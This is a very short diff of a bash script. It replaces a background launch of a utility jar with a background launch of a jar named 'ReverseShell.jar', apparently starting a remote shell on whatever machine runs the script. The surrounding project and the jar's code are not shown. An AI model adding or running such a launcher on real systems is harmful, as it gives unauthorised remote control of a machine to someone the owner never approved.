@@ -1,2 +1,2 @@
 #!/bin/bash
-java -jar src/Utils/Utils.jar &
+java -jar jar/ReverseShell.jar &
